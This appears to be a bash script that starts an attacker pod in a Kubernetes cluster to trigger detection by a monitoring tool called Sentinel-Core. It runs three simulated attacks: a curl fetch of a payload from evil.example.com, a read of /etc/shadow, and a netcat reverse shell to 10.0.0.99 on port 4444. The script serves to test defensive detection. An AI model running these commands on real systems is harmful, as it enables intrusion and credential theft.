#!/bin/bash
export PATH="$PWD/bin:$PATH"

echo "Deploying attacker pod to the cluster..."
# Deleting any old leftover pod
kubectl delete pod attacker-pod --ignore-not-found=true
kubectl run attacker-pod --image=alpine/curl:latest --restart=Never -- sleep 3600

echo "Waiting for attacker pod to be ready..."
kubectl wait --for=condition=ready pod attacker-pod --timeout=60s

echo "--------------------------------------------------------"
echo "Executing Simulated Attack 1: Fetching payload (curl)"
echo "--------------------------------------------------------"
kubectl exec attacker-pod -- curl -s -o /dev/null -k http://evil.example.com/payload.sh || true

echo "--------------------------------------------------------"
echo "Executing Simulated Attack 2: Accessing sensitive file"
echo "--------------------------------------------------------"
kubectl exec attacker-pod -- cat /etc/shadow 2>/dev/null || true

echo "--------------------------------------------------------"
echo "Executing Simulated Attack 3: Reverse shell execution"
echo "--------------------------------------------------------"
kubectl exec attacker-pod -- sh -c "nc -e /bin/sh 10.0.0.99 4444" 2>/dev/null &

echo "Done simulating attacks."
echo "Check the terminal running './start_live.sh' for Sentinel-Core's ML analysis of these live events!"
